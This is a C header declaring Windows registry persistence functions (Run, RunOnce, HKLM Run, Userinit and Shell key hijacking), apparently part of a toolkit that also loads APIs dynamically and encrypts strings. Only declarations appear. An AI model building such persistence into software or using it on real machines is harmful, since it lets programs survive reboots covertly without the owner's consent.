#pragma once

/*
 * PersistReg.h - Registry Persistence
 *
 * Provides registry-based persistence mechanisms.
 * WARNING: Use only with explicit user consent for legitimate purposes.
 */

#include <windows.h>
#include "ProcLoader.h"
#include "ApiLoader.h"
#include "StringCrypt.h"

// Registry persistence types
typedef enum _REG_PERSIST_TYPE {
    REG_PERSIST_RUN = 0,           // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    REG_PERSIST_RUNONCE = 1,       // HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    REG_PERSIST_RUN_SERVICE = 2,   // HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    REG_PERSIST_USERINIT = 3,      // Userinit key modification
    REG_PERSIST_SHELL = 4          // Shell key modification
} REG_PERSIST_TYPE;

// Registry persistence configuration
typedef struct _REG_PERSIST_CONFIG {
    REG_PERSIST_TYPE type;
    LPCSTR valueName;              // Registry value name
    LPCSTR targetPath;             // Target executable path
    LPCSTR arguments;              // Command line arguments
    BOOL bRequireAdmin;            // Requires admin privileges
} REG_PERSIST_CONFIG, *PREG_PERSIST_CONFIG;

// Function declarations

/**
 * Install registry persistence (Run key)
 * @param valueName Registry value name
 * @param targetPath Path to executable
 * @param arguments Optional arguments
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InstallRegPersistRun(LPCSTR valueName, LPCSTR targetPath, LPCSTR arguments);

/**
 * Install registry persistence (RunOnce key)
 * @param valueName Registry value name
 * @param targetPath Path to executable
 * @param arguments Optional arguments
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InstallRegPersistRunOnce(LPCSTR valueName, LPCSTR targetPath, LPCSTR arguments);

/**
 * Install registry persistence (HKLM Run key - requires admin)
 * @param valueName Registry value name
 * @param targetPath Path to executable
 * @param arguments Optional arguments
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InstallRegPersistRunMachine(LPCSTR valueName, LPCSTR targetPath, LPCSTR arguments);

/**
 * Remove registry persistence
 * @param valueName Registry value name
 * @param type Persistence type
 * @return TRUE if successful, FALSE otherwise
 */
BOOL RemoveRegPersist(LPCSTR valueName, REG_PERSIST_TYPE type);

/**
 * Check if registry persistence exists
 * @param valueName Registry value name
 * @param type Persistence type
 * @return TRUE if exists, FALSE otherwise
 */
BOOL CheckRegPersist(LPCSTR valueName, REG_PERSIST_TYPE type);

/**
 * Install registry persistence using configuration
 * @param pConfig Persistence configuration
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InstallRegPersist(PREG_PERSIST_CONFIG pConfig);

/**
 * Get current executable path
 * @param pPath Output buffer
 * @param maxSize Maximum buffer size
 * @return TRUE if successful, FALSE otherwise
 */
BOOL GetCurrentExePath(LPSTR pPath, SIZE_T maxSize);

/**
 * Install Userinit persistence (requires admin)
 * @param targetPath Path to executable
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InstallUserinitPersist(LPCSTR targetPath);

/**
 * Remove Userinit persistence
 * @param targetPath Path to remove
 * @return TRUE if successful, FALSE otherwise
 */
BOOL RemoveUserinitPersist(LPCSTR targetPath);

/**
 * Install Shell persistence
 * @param targetPath Path to executable
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InstallShellPersist(LPCSTR targetPath);

/**
 * Remove Shell persistence
 * @param targetPath Path to remove
 * @return TRUE if successful, FALSE otherwise
 */
BOOL RemoveShellPersist(LPCSTR targetPath);